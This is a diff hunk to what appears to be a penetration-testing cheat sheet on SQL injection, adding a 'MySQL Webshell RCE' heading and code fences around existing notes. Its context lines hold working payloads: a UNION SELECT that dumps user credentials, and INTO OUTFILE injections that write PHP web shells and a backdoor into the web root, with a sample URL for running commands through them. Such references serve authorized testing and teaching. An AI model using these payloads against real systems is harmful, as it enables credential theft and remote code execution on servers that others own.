@@ -124,7 +124,10 @@ Even though GROUP BY and ORDER BY have different functionality in SQL, they both
 ' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -  // Dump data from Columns using 0x3a as seperator
 ' union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'   // Backdoor
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // Write a WebShell To Disk via INTO OUTFILE directive. 192.168.191.x/tmp/webshell.php?cmd=ls
+```
 
+## MySQL Webshell RCE
+```
 Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
 For this attack to work, the file location (var/www/html/tmp/webshell.php) must be writable to the OS user running the database software.
 
